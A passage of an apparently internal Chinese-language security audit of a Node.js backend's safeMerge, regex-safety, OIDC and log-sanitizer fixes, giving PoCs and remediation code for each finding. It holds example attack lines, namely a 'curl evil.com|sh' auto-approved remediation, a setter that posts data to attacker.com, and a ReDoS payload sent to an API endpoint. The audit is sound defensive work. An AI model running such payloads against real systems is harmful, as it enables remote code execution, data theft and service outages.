        // attacker 控制了 remediation 的内容
        actions: [{ command: 'curl evil.com|sh', autoApprove: true }]
      })
    }
  };
  // 走 scanner ingestion API
  // → safeMerge 把 evil (EvilMetadata) 序列化为 plain object { actions: [...] }
  // → 存到 finding.remediation_json
  // → 如果有"一键执行 remediation"功能，attacker 拿到 RCE
  ```
- **影响**:
  - 真实可利用性：**中-高**（需要先有 scanner agent 失陷或 API 入口可注入 class instance；但 class instance 在 Express + body-parser 路径上**通常**会被反序列化成 plain object——除非有内部 RPC / worker queue 传 class instance）
  - 关键：toJSON 触发是**对每个 value 都触发**——如果合并路径中**任何** value 是 class instance，就会触发
- **修复建议**:
  ```ts
  // 1. 显式按类型转换，不走 JSON
  } else if (value instanceof Date) {
    target[key] = value.toISOString();
  } else if (value instanceof RegExp) {
    target[key] = { source: value.source, flags: value.flags };
  } else if (value instanceof Map) {
    target[key] = { __type: 'Map', entries: Array.from(value.entries()) };
  } else if (value instanceof Set) {
    target[key] = { __type: 'Set', values: Array.from(value.values()) };
  } else if (value instanceof Error) {
    target[key] = { name: value.name, message: value.message, stack: value.stack };
  } else if (value instanceof Buffer) {
    target[key] = { __type: 'Buffer', length: value.length, base64: value.toString('base64') };
  } else {
    // 拒绝其他特殊对象（class instance with toJSON）
    continue;
  }
  // 2. 或在 mergeInternal 入口先 isPlainObject + isPlainArray，过滤 class instance
  // 3. 在 stripProtoKeys 也加同样的过滤
  ```

### V11.15: `MAX_SOURCE_KEYS` 只在 depth=0 检查，nested 大对象绕过

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:136-140`
- **修复概述** (Wave 6 F15):
  - `if (depth === 0 && sourceKeys.length > maxSourceKeys) throw`
- **新攻击向量**:
  - 攻击者送 `{"a": { 10001 keys... }}` —— 顶层 1 个 key，通过
  - nested 对象 10001 个 key 不触发 throw
  - 内存放大：每个 key 写一份到 target，CPU 线性放大
  - 实际可利用性：**低**（因为整体 JSON 大小受 express body-parser 限制（默认 100kb），nested 10001 keys 也得塞进 body）
  - **但**：和 `maxDepth: 5` 配合，attacker 可以构造 `{a: {b: {c: {d: {e: { 10000 keys }}}}}}` —— 5 层嵌套，每层 10000 keys = 50000 keys
- **PoC**:
  ```ts
  const payload = {
    a: { b: { c: { d: { e: Object.fromEntries(Array.from({length: 10000}, (_, i) => [`k${i}`, i])) } } } }
  };
  safeMerge({}, payload, { maxDepth: 5, maxSourceKeys: 1000 });
  // 不 throw，但创建 10000 嵌套 key
  ```
- **影响**:
  - 真实可利用性：**低**（受 body-parser 100kb 限制）
- **修复建议**:
  ```ts
  // 1. 计算 total keys (depth × width) 累加
  let totalKeys = 0;
  function countKeys(value: unknown): number {
    if (!isPlainObject(value) && !isPlainArray(value)) return 0;
    let n = Object.keys(value).length;
    for (const v of Object.values(value)) n += countKeys(v);
    return n;
  }
  if (countKeys(source) > maxSourceKeys) throw ...
  // 2. 或限制 source JSON 字符串长度
  ```

### V11.16: `target` 不校验类型，class instance setter 触发 side-effect

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:103-115`
- **修复概述** (Wave 6 F15):
  - `safeMerge<T>(target: T, source: unknown, ...): T` — 不验证 target 类型
- **新攻击向量**:
  - 调用方传 `new SomeEventEmitter()` 当 target —— `target[key] = value` 触发 setter，可能 emit 事件
  - 真实场景：如果 target 是 Mongoose / Sequelize model instance，setter 触发 DB 同步
  - **实际调用点**：
    - `security-operations.service.ts:424` —— target 是 `{...this.parseJson(existing.metadata_json, {})}` 纯 plain object，OK
    - `devices.routes.ts:724` —— `Object.assign(codebook, safeMerge({} as Record<string, any>, entries))` —— target 是 `{}` 纯 plain object，OK
  - **但**：未来调用方如果传 ORM model / EventEmitter，side-effect 可能造成：
    - 触发 DB write (DoS / 注入)
    - 触发 event handler (RCE 如果 handler 链里有 eval)
    - 触发 HTTP request (SSRF)
- **PoC**:
  ```ts
  class EvTarget {
    _data: any = {};
    set metadata(value: any) {
      console.log('setter called with', value);
      // 假设这里有 DB write 或 HTTP request
      fetch('http://attacker.com/leak', { method: 'POST', body: JSON.stringify(value) });
    }
  }
  const t = new EvTarget();
  safeMerge(t, { metadata: { evil: true } });
  // t.metadata setter 触发 → attacker 拿到数据
  ```
- **影响**:
  - 真实可利用性：**低**（当前调用点都是 plain object）
- **修复建议**:
  ```ts
  export function safeMerge<T>(target: T, source: unknown, options: SafeMergeOptions = {}): T {
    if (!isPlainObject(target) && !isPlainArray(target)) {
      throw new Error('safeMerge: target must be a plain object or array');
    }
    // ...
  }
  ```

### V11.17: Symbol keys 静默忽略 —— 数据丢失 + PP 旁路

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:142` (`for (const key of sourceKeys)` 其中 `sourceKeys = Object.keys(source)`)
- **修复概述** (Wave 6 F15):
  - 用 `Object.keys()` 只取 string keys
- **新攻击向量**:
  - **数据丢失**：attacker 用 Symbol 携带数据（`{ [Symbol.iterator]: 'evil' }`），merge 后 Symbol 数据消失
  - **PP 旁路**：JS 的 `__proto__` setter 是 property accessor，不是 Symbol —— 所以 Symbol-based PP 攻击不直接成立
  - **但**：某些 lib 用 Symbol 作为 key（如 React 内部用 `Symbol.for('react.element')`），如果这些 Symbol 携带安全敏感数据，会丢失
- **PoC**:
  ```ts
  const s = Symbol.for('hidden');
  const src = { [s]: 'secret-data' };
  safeMerge({}, src);
  // merge result 没有 s 这个 key —— 'secret-data' 丢失
  ```
- **影响**:
  - 真实可利用性：**低**（典型业务不用 Symbol 当敏感数据 key）
- **修复建议**:
  - 文档化"Symbol keys 不 merge"
  - 或显式 `Object.getOwnPropertySymbols(source)` 也迭代，但 Symbol 不能是 `__proto__`，所以无 PP 风险

### V11.18: PP 防御只覆盖 3 个 key —— `__defineGetter__` / `__defineSetter__` / `valueOf` / `toString` 未过滤

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:36` (`FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype'])`)
- **修复概述** (Wave 6 F15):
  - 显式黑名单 3 个 PP-prone keys
- **新攻击向量**:
  - 经典 PP 路径 `__proto__` / `constructor.prototype` / `__defineGetter__` 中只挡了前 2 个
  - **`__defineGetter__` 旁路**：
    ```ts
    safeMerge(target, { __defineGetter__: 'evil' });
    // 不会过滤，__defineGetter__ 进 result（作为 own property）
    // 但 result 是 plain object，__defineGetter__ 是 Object.prototype 的方法
    // result.__defineGetter__('key', fn) 会调用 Object.prototype.__defineGetter__
    // 在 result 上定义 getter = attacker controlled
    ```
  - 实际利用需要下游代码调用 `result.__defineGetter__` —— 不常见但**有** JS lib 用 (e.g., lodash 内部)
  - **`toString` 旁路**：
    ```ts
    safeMerge(target, { toString: 'evil' });
    // 进 result，覆盖 Object.prototype.toString
    // 下游 `${result}` 会输出 'evil' 而不是 '[object Object]'
    ```
  - **影响**：低（需要特定下游调用模式）
- **PoC**:
  ```ts
  const r = safeMerge({}, { toString: 'hijacked', __defineGetter__: 'pwn' });
  `${r}`;  // → "hijacked"
  ```
- **影响**:
  - 真实可利用性：**低**（典型业务 `${obj}` 不做敏感操作）
- **修复建议**:
  ```ts
  const FORBIDDEN_KEYS = new Set([
    '__proto__', 'constructor', 'prototype',
    '__defineGetter__', '__defineSetter__', '__lookupGetter__', '__lookupSetter__',
    'hasOwnProperty', 'isPrototypeOf', 'propertyIsEnumerable',
    'toString', 'valueOf', 'toJSON',  // 这些覆盖会让 toString/valueOf 输出受控
  ]);
  ```

---

## 5. Cross-cutting 组合攻击

### V11.19: F13 (safeRegex) false negative → F15 校验仍通过 → tool-executor ReDoS 触发 event loop 锁死（P0 · TOP 2）

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\ai-agents\capabilities\tool-executor.ts:400-455`（regex execution）
  - `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:192`（HEAVY_BACKREFERENCE 漏报）
  - `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:225-230`（validateRegexPattern）
- **修复概述** (Wave 6 F13 + F15 联用):
  - F13：safe-regex 静态检测 4 大 ReDoS 家族
  - tool-executor 调用 `validateRegexPattern(p)` 然后 `new RegExp(p, 'gi')`
  - 配 `setTimeout(() => { timedOut = true; }, 1000)` cooperative timeout
- **新攻击向量**:
  - **关键**：cooperative timeout 在**单线程 JS**里**不会**真的中断 ReDoS
  - `regex.exec()` 是**同步**函数，引擎卡住时 event loop 被锁死
  - `setTimeout` 回调**永远不触发**（因为 event loop 锁了）
  - `timedOut` 永远是 `false`，`while` 循环**永远不会 break**
  - `MAX_MATCHES_PER_PATTERN = 1000` 在 catastrophic ReDoS 下也救不了——单次 `exec` 调用可能持续数小时
  - **攻击路径**：
    1. F13 的 HEAVY_BACKREFERENCE 漏报 `(.+)\1+`（V11.6）
    2. attacker 提交 `patterns: ['(.+)\\1+']` 给 `/api/ai-system/check_pattern`（如果该 API 暴露）
    3. validateRegexPattern **通过**（V11.6）
    4. `new RegExp('(.+)\\1+', 'gi')` 编译成功
    5. `regex.exec(hugeString)` 触发 O(n²) 匹配 → event loop 锁死
    6. **整个 Node.js 进程停摆**（HTTP 不响应、WS 不响应、所有 timer 都不触发）
  - **更阴险**：如果 attacker 同时提交 10 个 `(.+)\1+` 模式 → **多次** O(n²) 叠加 → 10 倍 lock 时间
- **PoC**:
  ```ts
  // AI system / tool-executor 端点（如果有 user-supplied pattern）
  await fetch('/api/ai-system/check_pattern', {
    method: 'POST',
    body: JSON.stringify({
      content: 'A'.repeat(100000),
      patterns: ['(.+)\\1+']  // 绕过 HEAVY_BACKREFERENCE（V11.6）
    })
  });
  // → backend Node.js 进程卡住，直到 OS OOM kill
  ```
- **影响**:
  - 真实可利用性：**中-高**（需要 check_pattern 端点接受 user pattern —— **需要 audit 确认**）
  - 影响面：整个 control plane HTTP/WS 不可用
- **修复建议**:
  ```ts
  // 1. 用 worker_threads 把 regex 执行隔离
  import { Worker } from 'worker_threads';
  // 2. 用 re2（linear-time regex engine）
  // npm install re2 --save
  // 3. 至少在 worker 进程里跑 regex
  // 4. cooperative timeout 改成 request-level timeout（请求 1s 没回来直接 abort）
  ```

### V11.20: F12 (OIDC) + F15 (safeMerge) 组合 —— OIDC profile 数据进 DB，但 profile 不经 safeMerge

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:393-420` (`resolveUser`)
  - `X:\repos\Networksafe\backend\src\modules\auth\auth-user.repository.ts:60-110` (`createAuthUser`)
- **修复概述**:
  - F12：`resolveUser` 把 OIDC userinfo profile 转为 AuthUserRow
  - F15：safeMerge 防御 PP
- **新攻击向量**:
  - `resolveUser` 没有用 `safeMerge`，**直接构造 row**（line 408-417）
  - `createAuthUser` 用 parameterised SQL（**不** SQL 注入）
  - **但**：
    - `profile.email` 直接进 row.email —— 长度 / 字符无校验（最长 64 char？255 char？看 schema）
    - `profile.preferred_username || profile.name || profile.email.split('@')[0]` —— **attacker 可控** username
    - `password_hash: oidc:${profile.sub}` —— sub 是 userinfo 的，可能含控制字符
  - **关键问题**：`profile.sub` 进 password_hash 字段
    - 如果 `password_hash` 字段长度限制 64 char，attacker 用 1000 字节 sub → DB 写入失败（被截断或报错）
    - 如果没有长度限制，DB 写入 1MB sub → DoS
    - **但更危险**：`profile.sub` 未来某天被当作 identifier 用在 SQL query 拼接（虽然 createAuthUser 现在 parameterised，但调用 row 的其他代码可能不）
  - 另一个角度：`profile.email.split('@')[0]` —— 如果 email 是 `"@"`（一个 @ 没有 local part）→ `[0] = ''` → username = '' → 后续 username uniqueness check 失败
- **PoC**:
  ```ts
  // 攻击者控制的 IdP 返回 userinfo:
  // { sub: 'A'.repeat(10000), email: 'victim@corp.com', preferred_username: '...' }
  // resolveUser 构造 row:
  //   password_hash: 'oidc:AAAA....AAAA' (10000 字节)
  // createAuthUser 执行
  //   SQLite error: too long for column (or similar)
  //   → 500 to client, OIDC login 失败
  //   反复触发 → DoS
  ```
- **影响**:
  - 真实可利用性：**低-中**（需要 IdP 失陷；与 V11.2 共享前置条件）
- **修复建议**:
  ```ts
  // 1. resolveUser 里 sanitize profile：
  const safeEmail = String(profile.email || '').slice(0, 255);
  const safeSub = String(profile.sub || '').slice(0, 128);
  const safeUsername = String(profile.preferred_username || profile.name || safeEmail.split('@')[0] || 'user').slice(0, 64);
  // 2. 强制 safeSub 只含 [a-zA-Z0-9._-]
  // 3. 用 safeMerge 替代手动构造（防御性）
  const row: AuthUserRow = {
    id: uuidv4(),
    email: safeEmail,
    username: safeUsername,
    password_hash: `oidc:${safeSub}`,
    // ...
  };
  ```

### V11.21: F14 (sanitizeString) + F15 (safeMerge) 组合 —— metadata 里的 credential 可能在 sanitize 之前已被 safeMerge 转换

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:159, 190`（JSON.stringify 转换）
  - `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:157`（sanitizeString）
- **修复概述**:
  - F14：sanitizeString 用 regex 模式匹配
  - F15：safeMerge 把 RegExp 序列化为 `{}`
- **新攻击向量**:
  - 攻击者在 scanner evidence 里塞 `RegExp 实例`（如 `new RegExp('ghp_[A-Za-z0-9]{36}')`）
  - **如果** scanner ingestion 走 safeMerge（V11.14 PoC 路径）→ RegExp 被 JSON.stringify 为 `{}`
  - evidence 里 `pattern: /ghp_xxx/` 变成 `pattern: {}`
  - 后续 logger 看到 `pattern: {}` —— 信息丢失但**没泄漏**（OK）
  - **但**：如果 safeMerge **没**被调用（直接 `Object.assign(target, userInput)`），RegExp 保留为实例
  - logger 调用 `JSON.stringify(logEntry)` —— RegExp 还是变 `{}`
  - `sanitizeString` 处理 string 字段，但 RegExp 不是 string
  - **结论**：RegExp 走 log 也不会泄漏（JSON 序列化变 `{}`）
  - **真正的问题**：F15 的 JSON 序列化在 merge 时执行，**和 sanitizeString 顺序有关**
  - 调用方 1：先 safeMerge 再 logger.info → safeMerge 序列化为 string/{} → sanitizeString 处理
  - 调用方 2：先 logger.info 再 safeMerge → logger 看到原始 RegExp → JSON.stringify 失败/变 {} → 丢失
- **影响**:
  - 真实可利用性：**低**（顺序问题一般不会造成 credential 泄漏，但会造成日志噪音）
- **修复建议**:
  - 文档化调用顺序（先 safeMerge 再 log）
  - 或在 logger 里强制走 `sanitize(input)` 包裹

---

## 附录 A：漏洞分类汇总

| 类别 | 数量 | P0 | P1 | P2 |
|------|------|----|----|-----|
| OIDC 验签边界 (F12) | 4 | 1 (V11.2) | 2 (V11.1, V11.3) | 1 (V11.4) |
| safeRegex parser 边角 (F13) | 4 | 1 (V11.6) | 0 | 3 (V11.5, V11.7, V11.8) |
| sanitizeString FP/FN (F14) | 5 | 2 (V11.9, V11.12) | 2 (V11.10, V11.11) | 1 (V11.13) |
| safeMerge 序列化 side-effect (F15) | 5 | 1 (V11.14) | 2 (V11.15, V11.18) | 2 (V11.16, V11.17) |
| Cross-cutting 组合 | 3 | 1 (V11.19) | 1 (V11.20) | 1 (V11.21) |
| **总计** | **21** | **6** | **7** | **8** |

## 附录 B：Top 3 最严重漏洞

1. **V11.2** — OIDC `email_verified` 未强制 → 跨租户账号接管（P0）
2. **V11.19** — safe-regex false negative (V11.6) × tool-executor fake timeout → 真 ReDoS 必出 DoS（P0）
3. **V11.9** — sanitizeString 40-char catch-all 漏掉长 secret 末尾 20+ 字节（P0）

## 附录 C：审计员读过的关键文件

- `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts` (F12 修复主体)
- `X:\repos\Networksafe\backend\src\utils\safe-regex.ts` (F13 修复主体)
- `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts` (F14 修复主体)
- `X:\repos\Networksafe\backend\src\utils\safe-merge.ts` (F15 修复主体)
- `X:\repos\Networksafe\backend\src\config\enterprise-runtime.ts` (OIDC 配置)
- `X:\repos\Networksafe\backend\src\modules\auth\auth-user.repository.ts` (OIDC user 落库)
- `X:\repos\Networksafe\backend\src\security\permissions.ts` (RBAC 定义)
- `X:\repos\Networksafe\backend\src\api\routes\auth.routes.ts` (OIDC callback 路由)
- `X:\repos\Networksafe\backend\src\ai-agents\capabilities\tool-executor.ts` (regex 调用方)
- `X:\repos\Networksafe\backend\src\services\security-operations.service.ts` (safeMerge 调用点之一)
- `X:\repos\Networksafe\backend\src\__tests__\utils\safe-merge.test.ts` (F15 测试覆盖)
- `X:\repos\Networksafe\backend\src\__tests__\utils\safe-regex.test.ts` (F13 测试覆盖)
- `X:\repos\Networksafe\backend\src\__tests__\utils\log-sanitizer.test.ts` (F14 测试覆盖)
- `X:\repos\Networksafe\backend\src\__tests__\services\oidc-auth.token-verify.test.ts` (F12 测试覆盖)
- `X:\repos\Networksafe\docs\security-audit\2026-06-06-wave5-meta-attack-2.md` (上一轮 wave 5 审计，作为 baseline)
